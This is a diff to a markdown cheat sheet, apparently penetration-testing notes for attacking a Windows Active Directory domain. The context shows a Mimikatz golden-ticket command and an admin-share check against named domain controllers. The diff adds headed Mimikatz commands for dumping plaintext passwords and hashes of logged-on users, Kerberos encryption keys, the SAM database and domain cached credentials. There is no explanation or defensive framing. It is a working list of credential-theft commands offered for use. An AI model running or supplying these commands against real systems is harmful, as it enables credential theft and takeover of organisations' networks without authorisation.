@@ -96,3 +96,35 @@ kerberos::golden /user:Administrator /domain:dev.ADMIN.TGIHF.COM /sid:S-1-5-21-1
 ```
 
 Test with `dir \\dc02.dev.ADMIN.TGIHF.COM\C$` or `dir \\dc03.ADMIN.TGIHF.COM\C$`.
+
+---
+
+## Dump Plaintext Passwords and Hashes of Logged On Users
+
+```powershell
+sekurlsa::logonpasswords
+```
+
+---
+
+## Dump Kerberos Encryption Keys
+
+```powershell
+sekurlsa::ekeys
+```
+
+---
+
+## Dump SAM
+
+```powershell
+lsadump::sam
+```
+
+---
+
+## Dump Domain Cached Credentials (DCC)
+
+```powershell
+lsadump::cache
+```
